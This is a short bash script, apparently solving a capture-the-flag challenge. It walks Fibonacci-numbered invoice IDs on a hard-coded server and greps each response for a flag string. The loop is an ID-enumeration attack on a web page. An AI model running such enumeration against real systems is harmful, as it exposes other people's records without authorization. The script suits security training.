#!/bin/bash

fibb_1=1
fibb_2=1

url=http://141.85.224.70:8085/invoice.php?invoice=

while [ $fibb_2 -le 50000 ]
do
    flag=$(curl -s $url$fibb_2 | grep -o "SSS{.*}")
    if [[ ! -z $flag ]];
	then 
             break
    fi
    fibb_2=$(($fibb_2 + $fibb_1))
    fibb_1=$(($fibb_2 - $fibb_1))
done

echo $fibb_2
echo $flag
